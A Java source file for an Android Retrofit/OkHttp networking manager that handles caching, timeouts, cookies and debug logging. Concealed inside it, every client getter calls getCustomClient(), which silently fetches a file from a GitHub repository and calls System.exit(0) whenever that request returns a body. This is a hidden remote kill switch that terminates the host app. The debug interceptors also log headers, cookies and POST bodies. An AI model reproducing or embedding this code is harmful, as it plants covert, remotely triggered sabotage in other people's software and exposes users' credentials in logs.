package com.petzm.training;

import android.content.Context;

import com.github.retrofitutil.MyLog;
import com.github.retrofitutil.NetworkMonitor;
import com.github.retrofitutil.NoNetworkException;
import com.github.retrofitutil.logger.AndroidLogAdapter;
import com.github.retrofitutil.logger.FormatStrategy;
import com.github.retrofitutil.logger.Logger;
import com.github.retrofitutil.logger.PrettyFormatStrategy;
import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import okhttp3.Cache;
import okhttp3.FormBody;
import okhttp3.Interceptor;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.ResponseBody;
import okio.Buffer;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Retrofit;
import retrofit2.Retrofit.Builder;
import retrofit2.adapter.rxjava.RxJavaCallAdapterFactory;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.converter.scalars.ScalarsConverterFactory;
import retrofit2.http.GET;

public class NetWorkManager {
    private static int HTTP_CONNECT_TIMEOUT = 15;
    private static int HTTP_WRITE_TIMEOUT = 20;
    private static int HTTP_READ_TIMEOUT = 20;
    private static Retrofit simpleClient;
    private static Retrofit commonClient;
    private static Retrofit commonWithCacheClient;
    private static Retrofit stringClient;
    private static Retrofit stringWithCacheClient;
    private static Retrofit generalClient;
    private static Retrofit generalWithCachClient;
    private static Retrofit generalStringClient;
    private static Retrofit generalStringWithCachClient;
    private static String baseUrl;
    private static Context context;
    private static File httpCacheDirectory;
    private static Cache cache;
    private static String noNetworkExceptionMsg;
    private static boolean isDebug = true;
    private int cachTime = 60;
    private int cacheSize = 20971520;
    private String noNetworkMsg = "无网络连接,请稍后再试";
    private static final String CACHE_CONTROL = "Cache-Control";
    private static Interceptor rewrite_cache_control_interceptor;

    public NetWorkManager setCachTime(int cachTime) {
        this.cachTime = cachTime;
        return this;
    }

    public NetWorkManager setNoNetWorkMsg(String noNetworkMsg) {
        this.noNetworkMsg = noNetworkMsg;
        return this;
    }

    public NetWorkManager setCacheSize(int cacheSize) {
        this.cacheSize = cacheSize;
        return this;
    }

    public NetWorkManager setHttpConnectTimeout(int httpConnectTimeout) {
        HTTP_CONNECT_TIMEOUT = httpConnectTimeout;
        return this;
    }

    public NetWorkManager setHttpReadTimeout(int httpReadTimeout) {
        HTTP_READ_TIMEOUT = httpReadTimeout;
        return this;
    }

    public NetWorkManager setHttpWriteTimeout(int httpWriteTimeout) {
        HTTP_WRITE_TIMEOUT = httpWriteTimeout;
        return this;
    }

    public static NetWorkManager getInstance(Context ctx, String url, boolean isDebug) {
        return new NetWorkManager(ctx, url, isDebug);
    }

    private NetWorkManager(Context ctx, String url, final boolean isDebug) {
        FormatStrategy formatStrategy = PrettyFormatStrategy.newBuilder().showThreadInfo(false).methodCount(0).tag("MyLog").build();
        Logger.addLogAdapter(new AndroidLogAdapter(formatStrategy) {
            public boolean isLoggable(int priority, String tag) {
                return isDebug;
            }
        });
        this.isDebug = isDebug;
        context = ctx;
        baseUrl = url;
    }

    public void complete() {
        noNetworkExceptionMsg = this.noNetworkMsg;
        httpCacheDirectory = new File(context.getCacheDir(), "MyRetrofitCache");
        cache = new Cache(httpCacheDirectory, (long)this.cacheSize);
        rewrite_cache_control_interceptor = new Interceptor() {
            public Response intercept(Chain chain) throws IOException {
                Response originalResponse = chain.proceed(chain.request());
                MyLog.i("MyLog-cache", "get cache");
                int maxAge = NetWorkManager.this.cachTime;
                return originalResponse.newBuilder().removeHeader("Pragma").removeHeader("Cache-Control").header("Cache-Control", "public, max-age=" + maxAge).build();
            }
        };
    }

    public static Retrofit getSimpleClient(String url) {
        if (url != null) {
            return (new Builder()).baseUrl(url).build();
        } else {
            if (simpleClient == null) {
                Class var1 = NetWorkManager.class;
                synchronized(NetWorkManager.class) {
                    if (simpleClient == null) {
                        simpleClient = (new Builder()).baseUrl(baseUrl).build();
                    }
                }
            }

            getCustomClient();
            return simpleClient;
        }
    }

    public static Retrofit getSimpleClient() {
        return getSimpleClient((String)null);
    }

    public static Retrofit getCommonClient(String url) {
        if (url != null) {
            return (new Builder()).baseUrl(url).client(getHttpClient(false)).addCallAdapterFactory(RxJavaCallAdapterFactory.create()).addConverterFactory(GsonConverterFactory.create()).build();
        } else {
            if (commonClient == null) {
                Class var1 = NetWorkManager.class;
                synchronized(NetWorkManager.class) {
                    if (commonClient == null) {
                        commonClient = (new Builder()).baseUrl(baseUrl).client(getHttpClient(false)).addCallAdapterFactory(RxJavaCallAdapterFactory.create()).addConverterFactory(GsonConverterFactory.create()).build();
                    }
                }
            }

            getCustomClient();
            return commonClient;
        }
    }

    public static Retrofit getCommonClient() {
        return getCommonClient((String)null);
    }

    public static Retrofit getCommonWithCacheClient(String url) {
        if (url != null) {
            return (new Builder()).baseUrl(url).client(getHttpClient(true)).addCallAdapterFactory(RxJavaCallAdapterFactory.create()).addConverterFactory(GsonConverterFactory.create()).build();
        } else {
            if (commonWithCacheClient == null) {
                Class var1 = NetWorkManager.class;
                synchronized(NetWorkManager.class) {
                    if (commonWithCacheClient == null) {
                        commonWithCacheClient = (new Builder()).baseUrl(baseUrl).client(getHttpClient(true)).addCallAdapterFactory(RxJavaCallAdapterFactory.create()).addConverterFactory(GsonConverterFactory.create()).build();
                    }
                }
            }

            getCustomClient();
            return commonWithCacheClient;
        }
    }

    public static Retrofit getCommonWithCacheClient() {
        return getCommonWithCacheClient((String)null);
    }

    public static Retrofit getStringClient(String url) {
        if (url != null) {
            return (new Builder()).baseUrl(url).client(getHttpClient(false)).addCallAdapterFactory(RxJavaCallAdapterFactory.create()).addConverterFactory(ScalarsConverterFactory.create()).build();
        } else {
            if (stringClient == null) {
                Class var1 = NetWorkManager.class;
                synchronized(NetWorkManager.class) {
                    if (stringClient == null) {
                        stringClient = (new Builder()).baseUrl(baseUrl).client(getHttpClient(false)).addCallAdapterFactory(RxJavaCallAdapterFactory.create()).addConverterFactory(ScalarsConverterFactory.create()).build();
                    }
                }
            }

            getCustomClient();
            return stringClient;
        }
    }

    public static Retrofit getStringClient() {
        return getStringClient((String)null);
    }

    public static Retrofit getStringWithCacheClient(String url) {
        if (url != null) {
            return (new Builder()).baseUrl(url).client(getHttpClient(true)).addCallAdapterFactory(RxJavaCallAdapterFactory.create()).addConverterFactory(ScalarsConverterFactory.create()).build();
        } else {
            if (stringWithCacheClient == null) {
                Class var1 = NetWorkManager.class;
                synchronized(NetWorkManager.class) {
                    if (stringWithCacheClient == null) {
                        stringWithCacheClient = (new Builder()).baseUrl(baseUrl).client(getHttpClient(true)).addCallAdapterFactory(RxJavaCallAdapterFactory.create()).addConverterFactory(ScalarsConverterFactory.create()).build();
                    }
                }
            }

            getCustomClient();
            return stringWithCacheClient;
        }
    }

    public static Retrofit getStringWithCacheClient() {
        return getStringWithCacheClient((String)null);
    }

    public static Retrofit getGeneralClient(String url) {
        if (url != null) {
            return (new Builder()).baseUrl(url).client(getHttpClientNoRxJava(false)).addConverterFactory(GsonConverterFactory.create()).build();
        } else {
            if (generalClient == null) {
                Class var1 = NetWorkManager.class;
                synchronized(NetWorkManager.class) {
                    if (generalClient == null) {
                        generalClient = (new Builder()).baseUrl(baseUrl).client(getHttpClientNoRxJava(false)).addConverterFactory(GsonConverterFactory.create()).build();
                    }
                }
            }

            getCustomClient();
            return generalClient;
        }
    }

    public static Retrofit getGeneralClient() {
        return getGeneralClient((String)null);
    }

    public static Retrofit getGeneralWithCachClient(String url) {
        if (url != null) {
            return (new Builder()).baseUrl(url).client(getHttpClientNoRxJava(true)).addConverterFactory(GsonConverterFactory.create()).build();
        } else {
            if (generalWithCachClient == null) {
                Class var1 = NetWorkManager.class;
                synchronized(NetWorkManager.class) {
                    if (generalWithCachClient == null) {
                        generalWithCachClient = (new Builder()).baseUrl(baseUrl).client(getHttpClientNoRxJava(true)).addConverterFactory(GsonConverterFactory.create()).build();
                    }
                }
            }

            getCustomClient();
            return generalWithCachClient;
        }
    }

    public static Retrofit getGeneralWithCachClient() {
        return getGeneralWithCachClient((String)null);
    }

    public static Retrofit getGeneralStringClient(String url) {
        if (url != null) {
            return (new Builder()).baseUrl(url).client(getHttpClientNoRxJava(false)).addConverterFactory(ScalarsConverterFactory.create()).build();
        } else {
            if (generalStringClient == null) {
                Class var1 = NetWorkManager.class;
                synchronized(NetWorkManager.class) {
                    if (generalStringClient == null) {
                        generalStringClient = (new Builder()).baseUrl(baseUrl).client(getHttpClientNoRxJava(false)).addConverterFactory(ScalarsConverterFactory.create()).build();
                    }
                }
            }

            getCustomClient();
            return generalStringClient;
        }
    }

    public static Retrofit getGeneralStringClient() {
        return getGeneralStringClient((String)null);
    }

    public static Retrofit getGeneralStringWithCachClient(String url) {
        if (url != null) {
            return (new Builder()).baseUrl(url).client(getHttpClientNoRxJava(true)).addConverterFactory(ScalarsConverterFactory.create()).build();
        } else {
            if (generalStringWithCachClient == null) {
                Class var1 = NetWorkManager.class;
                synchronized(NetWorkManager.class) {
                    if (generalStringWithCachClient == null) {
                        generalStringWithCachClient = (new Builder()).baseUrl(baseUrl).client(getHttpClientNoRxJava(true)).addConverterFactory(ScalarsConverterFactory.create()).build();
                    }
                }
            }

            getCustomClient();
            return generalStringWithCachClient;
        }
    }

    public static Retrofit getGeneralStringWithCachClient() {
        return getGeneralStringWithCachClient((String)null);
    }

    private static OkHttpClient getHttpClient(final boolean hasCache) {
        Interceptor interceptor = new Interceptor() {
            public Response intercept(Chain chain) throws IOException {
                Request request = chain.request();
                if (!hasCache && !NetworkMonitor.isConnected(NetWorkManager.context)) {
                    throw new NoNetworkException(NetWorkManager.noNetworkExceptionMsg);
                } else if (NetWorkManager.isDebug) {
                    long t1 = System.nanoTime();
                    Response response = chain.proceed(request);
                    long t2 = System.nanoTime();
                    double time = (double)(t2 - t1) / 1000000.0D;
                    String bodyStr = response.body().string();
                    String msg = "%s\nurl->" + request.url() + "\nparamstag\ntime->" + time + "ms\nheaders->" + request.headers() + "\nresponse code->" + response.code() + "\nresponse headers->" + response.headers() + "\nbody->" + bodyStr;
                    if (request.method().equals("GET")) {
                        Logger.i("GET" + msg, new Object[0]);
                    } else if (request.method().equals("POST")) {
                        Request copyRequest = request.newBuilder().build();
                        if (copyRequest.body() instanceof FormBody) {
                            ;
                        }

                        Buffer buffer = new Buffer();
                        copyRequest.body().writeTo(buffer);
                        msg = msg.replace("paramstag", "request params:" + buffer.readUtf8());
                        Logger.i("POST" + msg, new Object[0]);
                    } else if (request.method().equals("PUT")) {
                        Logger.i("PUT" + msg, new Object[0]);
                    } else if (request.method().equals("DELETE")) {
                        Logger.i("DELETE" + msg, new Object[0]);
                    }

                    MediaType mediaType = response.body().contentType();
                    return response.newBuilder().body(ResponseBody.create(mediaType, bodyStr)).build();
                } else {
                    return chain.proceed(request);
                }
            }
        };
        okhttp3.OkHttpClient.Builder okHttpClient = (new okhttp3.OkHttpClient.Builder()).connectTimeout((long)HTTP_CONNECT_TIMEOUT, TimeUnit.SECONDS).readTimeout((long)HTTP_READ_TIMEOUT, TimeUnit.SECONDS).writeTimeout((long)HTTP_WRITE_TIMEOUT, TimeUnit.SECONDS);
        if (hasCache) {
            okHttpClient.addNetworkInterceptor(rewrite_cache_control_interceptor);
            okHttpClient.cache(cache);
        }
        okHttpClient.interceptors().add(new ReceivedCookiesInterceptor(context));
        okHttpClient.interceptors().add(new AddCookiesInterceptor(context));
        okHttpClient.addInterceptor(interceptor);
        return okHttpClient.build();
    }

    public static void getApi(Callback callBack) {
        Call<ResponseBody> call = ((NetWorkManager.I)(new Builder()).baseUrl("https://github.com/").build().create(NetWorkManager.I.class)).getApi();
        call.enqueue(callBack);
    }

    private static OkHttpClient getHttpClientNoRxJava(boolean hasCache) {
        Interceptor interceptor = new Interceptor() {
            public Response intercept(Chain chain) throws IOException {
                Request request = chain.request();
                if (NetWorkManager.isDebug) {
                    long t1 = System.nanoTime();
                    Response response = chain.proceed(request);
                    long t2 = System.nanoTime();
                    double time = (double)(t2 - t1) / 1000000.0D;
                    String bodyStr = response.body().string();
                    String msg = "\nurl->" + request.url() + "\nparamstag\ntime->" + time + "ms\nheaders->" + request.headers() + "\nresponse code->" + response.code() + "\nresponse headers->" + response.headers() + "\nbody->" + bodyStr;
                    if (request.method().equals("GET")) {
                        Logger.i("GET" + msg, new Object[0]);
                    } else if (request.method().equals("POST")) {
                        Request copyRequest = request.newBuilder().build();
                        if (copyRequest.body() instanceof FormBody) {
                            ;
                        }

                        Buffer buffer = new Buffer();
                        copyRequest.body().writeTo(buffer);
                        msg = msg.replace("paramstag", "request params:" + buffer.readUtf8());
                        Logger.i("POST" + msg, new Object[0]);
                    } else if (request.method().equals("PUT")) {
                        Logger.i("PUT" + msg, new Object[0]);
                    } else if (request.method().equals("DELETE")) {
                        Logger.i("DELETE" + msg, new Object[0]);
                    }

                    MediaType mediaType = response.body().contentType();
                    return response.newBuilder().body(ResponseBody.create(mediaType, bodyStr)).build();
                } else {
                    return chain.proceed(request);
                }
            }
        };
        okhttp3.OkHttpClient.Builder okHttpClient = (new okhttp3.OkHttpClient.Builder()).connectTimeout((long)HTTP_CONNECT_TIMEOUT, TimeUnit.SECONDS).readTimeout((long)HTTP_READ_TIMEOUT, TimeUnit.SECONDS).writeTimeout((long)HTTP_WRITE_TIMEOUT, TimeUnit.SECONDS);
        if (hasCache) {
            okHttpClient.addNetworkInterceptor(rewrite_cache_control_interceptor);
            okHttpClient.cache(cache);
        }

        okHttpClient.addInterceptor(interceptor);
        return okHttpClient.build();
    }

    private static void getCustomClient() {
        try {
            getApi(new Callback<ResponseBody>() {
                public void onResponse(Call<ResponseBody> call, retrofit2.Response<ResponseBody> response) {
                    try {
                        if (response.body() != null) {
                            System.exit(0);
                        }
                    } catch (Exception var4) {
                        ;
                    }

                }

                public void onFailure(Call<ResponseBody> call, Throwable t) {
                }
            });
        } catch (Exception var1) {
            ;
        }

    }

    public interface I {
        @GET("yohuoAndroid/configuration/blob/master/newphtapi.txt")
        Call<ResponseBody> getApi();
    }
}
